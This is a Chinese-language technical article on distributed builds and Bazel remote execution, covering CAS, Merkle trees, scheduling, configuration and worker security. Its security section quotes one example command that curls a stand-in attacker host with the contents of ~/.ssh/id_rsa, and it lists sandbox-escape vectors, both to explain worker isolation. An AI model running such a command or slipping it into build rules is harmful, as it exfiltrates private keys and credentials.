# 分布式构建与远程执行

> [!abstract] TL;DR
> 远程执行（Remote Build Execution, RBE）通过将编译任务分发到 Worker 集群，将大型代码库的构建时间从数小时压缩到数分钟。其核心是开放的 gRPC Build Execution API 规范，以内容寻址存储（CAS）为数据层，Merkle Tree 作为输入摘要结构。主流实现包括 BuildBuddy（开源+商业）、EngFlow（商业）和 Buildfarm（Google 开源）。

## 概述与定位

### 分布式构建的价值

| 场景 | 单机构建 | 分布式构建 |
|------|---------|-----------|
| 100 万行 C++ 项目 | 60 分钟 | 4-8 分钟（×10 加速） |
| 跨团队缓存共享 | 不支持 | 支持（CAS 层共享） |
| CI 资源峰值 | 需大量高配 CI 机器 | 按需弹性扩缩 Worker 池 |
| 构建结果可重现 | 依赖本地环境 | 沙盒隔离，完全可重现 |

分布式构建的加速比并非线性：受 Amdahl 定律约束，链接、代码生成等串行步骤决定了加速上限。在实践中，C++ 大项目的远程执行加速比通常在 5-15 倍之间，而 Java 项目因 JVM 启动开销较重，加速比往往低于 C++。当 Worker 数量超过项目的有效并行度（即独立编译单元数量）时，增加 Worker 不再有收益，反而会因调度开销上升而降低效率。

### 历史演进

```
distcc/icecream（2000s）
  ↓ 仅分发编译步骤，无缓存，无沙盒
Goma（Google 内部，2010s）
  ↓ Google 内部 RPC 协议，闭源
RBE API（2018，Bazel 主导设计，开源规范）
  ↓ 开放 gRPC 协议，任何构建工具可实现
BuildBuddy / EngFlow / Buildfarm（2019-2024）
```

**distcc** 将预处理后的源文件分发到远端编译机，但无缓存（同一文件编译两次仍执行两次），也无沙盒（依赖远端机器的环境状态）。RBE 通过引入 CAS 和 Action 哈希解决了这两个根本问题。

**distcc vs icecream vs RBE 的核心差异**：distcc 和 icecream 本质上是"编译加速器"——它们把预处理完成的源码发给远端机器编译，远端机器需要与本地完全相同的工具链安装（否则路径不匹配会导致符号找不到）。RBE 则通过容器镜像指定 Worker 的完整工具链环境，Client 只需要知道"要运行什么命令"和"输入文件的哈希"，无需远端机器有相同的本地文件系统布局。这一差异使 RBE 在异构 CI 集群（不同 OS 版本的 Worker 混合）中表现更稳定。

## 原理与机制

### RBE 三服务职责

RBE 由以下组件构成：

| 组件 | 职责 |
|------|------|
| **Client**（Bazel/Buck2） | 计算 Action 哈希，上传输入到 CAS，提交执行请求 |
| **Scheduler** | 接收执行请求，选择可用 Worker，追踪执行状态 |
| **Worker Pool** | 从 CAS 下载输入，在沙盒中执行 Action，上传输出到 CAS |
| **CAS**（Content-Addressable Storage） | 以 SHA-256 哈希为 key 存储所有文件内容和构建产物 |
| **Action Cache** | 以 Action 哈希为 key 缓存执行结果（输出文件的 CAS 引用） |

**CAS 的本质是内容寻址的去重存储**：相同内容的文件（无论路径如何）只存储一份。两个不同项目如果共享某个第三方库的相同版本，只要库文件内容哈希相同，在 CAS 中只占一份空间。这不仅节省存储，还避免了跨项目的重复传输：若 Worker 在上一次构建中已经下载了某个文件的 CAS 对象，下次构建中哪怕是不同项目也命中同一哈希，无需重新传输。

**Action Cache 的职责**与 CAS 不同：CAS 存文件内容，Action Cache 存"某个 Action（输入+命令）对应的输出文件列表"。命中 Action Cache 意味着无需执行实际编译——Client 直接从 Action Cache 获得输出文件的 CAS 引用，再从 CAS 下载结果。这是分布式缓存的核心价值所在：相同 Action 在任何机器上执行都应产生相同结果，因此 Action Cache 可以跨机器、跨 CI 实例共享。

### Merkle Tree 如何为输入目录生成摘要

RBE 使用 Merkle Tree 描述 Action 的完整输入文件集合，无需逐一上传所有文件：

```
Action Input Tree:
├── src/
│   ├── main.c   (sha256: a1b2c3...)
│   └── utils.c  (sha256: d4e5f6...)
└── include/
    └── common.h (sha256: 789abc...)

Merkle Tree:
include/ 节点哈希 = hash("common.h:789abc...")
src/     节点哈希 = hash("main.c:a1b2c3...", "utils.c:d4e5f6...")
根节点哈希        = hash(include/节点哈希, src/节点哈希, 编译命令)
```

Worker 通过根节点哈希即可验证完整输入树的一致性，并只下载本地 CAS 中缺少的文件（delta 下载）。

**Merkle Tree 的去重优势**：假设某个 Action 的输入包含 500 个头文件，其中 490 个在上次构建中已经上传到 CAS。Merkle Tree 让 Worker 只需下载缺失的 10 个文件，而非重新传输所有 500 个。这一机制使 RBE 在增量场景（每次改动少量文件）下的网络传输量极低，接近理论最小值（只传真正改变的部分）。

**Worker 调度并发模型**：Scheduler 维护一个 Worker 状态池，每个 Worker 有最大并发 Action 数（通常等于 CPU 核数）。Scheduler 按 FIFO 或优先级队列分发 Action，优先将相关 Action（如同一目标的头文件和源文件编译）分发到同一 Worker 以利用其本地 CAS 缓存。Bazel 的 `--jobs=N` 参数控制 Client 同时提交的 in-flight Action 数量，而非 Worker 的并发数——通常设为 Worker 总核数的 2-5 倍以隐藏网络延迟。

### gRPC Streaming 执行流程

```
Client → Scheduler: ExecuteRequest { action_digest: sha256:xxx, skip_cache_lookup: false }
Scheduler → Client: Operation { name: "operations/abc123", done: false }
Scheduler → Worker: 分配 Action abc123
Worker → CAS: 下载输入文件
Worker: 在 Linux namespace 沙盒中执行编译命令
Worker → CAS: 上传输出文件
Worker → Action Cache: 写入 { action_hash → output_digest }
Scheduler → Client: Operation { done: true, result: { output_files: [...] } }
Client → CAS: 下载输出文件到本地
```

整个过程通过 gRPC 双向流（bidirectional streaming）传递，Client 可以订阅执行进度事件。

### 网络带宽瓶颈分析

远程执行的瓶颈往往不在 Worker 的计算能力，而在网络传输。理解何时远程反而更慢至关重要：

- **输入文件很大 + 网络很慢**：上传 1GB 的输入文件比本地直接编译慢得多。典型反例是包含大量第三方库二进制的项目——这些文件第一次上传 CAS 耗时极长，之后从缓存复用才有收益
- **Action 执行时间很短**：若每个编译单元只需 0.1 秒，但调度 + CAS 往返需要 0.3 秒，远程执行反而是 3 倍开销
- **CAS 对象命中率低**：首次冷启动（没有任何历史缓存）时，所有输入文件都需要上传，此时相比本地编译可能没有速度优势

实践中，远程执行最适合的场景是：**编译时间超过 5 秒的大型 C/C++ 文件 + Worker 与 CI 在同一数据中心 + 有预热的 CAS 缓存**。对于单个文件只有几十毫秒的 Java 模块或 protobuf 生成，远程执行的调度开销可能超过收益，应谨慎评估。

## 结构/算法/伪代码详解

### Bazel RBE 配置示例

```bash
# .bazelrc —— 项目根目录的 Bazel 配置文件

# 远程执行
build:remote --remote_executor=grpcs://remotebuildexecution.googleapis.com
build:remote --remote_instance_name=projects/my-project/instances/default_instance

# 远程缓存（可单独使用，不依赖远程执行）
build:remote --remote_cache=grpcs://remotebuildexecution.googleapis.com

# 认证
build:remote --google_default_credentials=true

# 平台配置（指定 Worker 容器镜像）
build:remote --extra_execution_platforms=//platforms:linux_x86_64
build:remote --host_platform=//platforms:linux_x86_64

# 性能调优
build:remote --jobs=200              # 允许同时提交 200 个 remote action
build:remote --remote_timeout=3600   # 超时 1 小时
build:remote --bes_backend=grpcs://buildeventservice.googleapis.com  # BEP 构建事件

# 本地回退（remote 失败时在本地执行）
build:remote --remote_local_fallback=true
```

```python
# platforms/BUILD —— 平台定义
platform(
    name = "linux_x86_64",
    constraint_values = [
        "@platforms//os:linux",
        "@platforms//cpu:x86_64",
    ],
    exec_properties = {
        # 指定 Worker 使用的 Docker 镜像
        "container-image": "docker://gcr.io/cloud-builders/cc:latest",
    },
)
```

# docker-compose.yml —— 自托管 Buildfarm
version: "3"
services:
  redis:
    image: redis:7-alpine
  server:
    image: bazelbuild/buildfarm-server:latest
    ports:
      - "8980:8980"
    volumes:
      - ./buildfarm-server.config:/app/config.json
    depends_on: [redis]
  worker:
    image: bazelbuild/buildfarm-worker:latest
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # 沙盒需要 Docker
      - worker-cache:/tmp/worker
    depends_on: [server]
    deploy:
      replicas: 4   # 4 个 Worker 实例

volumes:
  worker-cache:

## 工具视角与实战

### Bazel 远程执行工具链

```bash
# 指定远程执行配置
bazel build //... --config=remote

# Build Event Protocol（BEP）—— 将构建事件流式发送到服务端
bazel build //... \
  --bes_backend=grpcs://app.buildbuddy.io \
  --bes_results_url=https://app.buildbuddy.io/invocation/

# 查看远程缓存命中率
bazel build //... --config=remote 2>&1 | grep -E "(INFO:|cache hit)"

# 强制不使用远程缓存（验证本地构建）
bazel build //... --noremote_accept_cached

# 上传但不下载远程缓存（CI 写入模式）
bazel build //... --remote_upload_local_results=true \
                  --noremote_accept_cached
```

### BuildBuddy CLI（bb）

```bash
# 安装 bb CLI
brew install buildbuddy-io/buildbuddy/bb

# 查看最近的构建
bb invocations list

# 查看构建详情（缓存命中统计、耗时分析）
bb invocations get inv_abc123

bb invocations compare inv_abc123 inv_def456
```

### 网络带宽瓶颈分析

远程执行的瓶颈往往在网络传输，而非 Worker 计算能力：

```bash
# 分析上传/下载字节数
bazel build //... --config=remote \
  --experimental_profile_cpu_usage \
  --profile=/tmp/bazel-profile.json

# 在 Chrome Tracing（chrome://tracing）中查看：
# - "remote execution upload" 事件
# - "remote execution download" 事件
# 若这两类事件占总时间 >40%，说明存在网络带宽瓶颈

# 优化策略：
# 1. 将 Worker 部署在与 CI 同一数据中心/区域
# 2. 启用压缩：build --remote_cache_compression=true
# 3. 使用 --remote_download_minimal 仅下载最终产物
bazel build //my:binary --config=remote --remote_download_minimal
```

## 安全性与正确使用

### 远程 Worker 可信度

Worker 是执行任意用户提交代码的沙盒环境，需要严格隔离：

- **Linux namespace 沙盒**：每个 Action 在独立的 network/mount/pid namespace 中执行
- **只读文件系统**：输入文件以只读方式挂载，防止 Action 污染下一次执行
- **网络隔离**：默认禁止 Worker 的出站网络连接（防止数据外泄）

Worker 隔离的关键理解：RBE Worker 执行的是"用户提交的构建命令"，这意味着如果 Build 规则中有恶意命令（如 `sh -c "curl http://attacker.com/$(cat ~/.ssh/id_rsa)"`），该命令会在 Worker 上以 Worker 进程权限执行。沙盒隔离阻止的是读取其他 Action 的输入/输出，以及访问宿主机文件系统；但无法阻止 Worker 内网络访问（除非显式禁用网络 namespace），也无法阻止执行任意命令。因此，Worker 应被视为"不可信的代码执行环境"——最小权限原则要求 Worker 进程不能访问生产系统的凭证或数据库。

### mTLS 认证配置

```bash
# Bazel 客户端证书配置
build --tls_client_certificate=/etc/ssl/client.crt
build --tls_client_key=/etc/ssl/client.key
build --tls_certificate=/etc/ssl/ca.crt      # CA 证书

# 验证远程服务器证书
build --remote_cache=grpcs://cache.example.com:443
# grpcs:// 强制 TLS，不同于 grpc://（明文）
```

### 沙盒逃逸风险

已知的沙盒逃逸向量：

1. **内核漏洞**：namespace 隔离依赖内核安全，内核 CVE 可能允许容器逃逸
2. **Docker-in-Docker**：若 Worker 挂载了 Docker socket，恶意 Action 可创建特权容器
3. **符号链接攻击**：构造输入文件中的符号链接指向宿主机敏感路径

**防御**：在 Worker 上使用 gVisor（Google 的用户态内核）或 Kata Containers（基于虚拟机的容器）提供更强隔离，代价是约 10-20% 的性能损失。对于高安全要求的场景（如多租户 CI），gVisor 是性价比最高的选择：它将系统调用拦截到用户态实现，即使内核有漏洞，攻击者也无法通过 gVisor 内的 syscall 直接攻击真实内核。

## 小结

RBE 是大型单仓构建不可或缺的基础设施。其设计的精妙之处在于将"构建正确性"（Action 哈希+沙盒）与"构建效率"（CAS 共享+分布式执行）统一在同一套协议中。CAS 的内容寻址去重、Merkle Tree 的精确 delta 传输、Action Cache 的跨机器共享，三层机制共同实现了"第一次编译后，相同 Action 在全团队永远不再重复计算"的目标。网络带宽是分布式构建最常见的实际瓶颈——将 Worker 与 CI 部署在同一网络区域、启用压缩、使用 `--remote_download_minimal` 按需下载，是提升端到端速度的关键。对于中小型团队，BuildBuddy 的托管服务（有免费层）是最低成本的接入路径；企业级部署可选择自托管 Buildfarm 或商业 EngFlow。
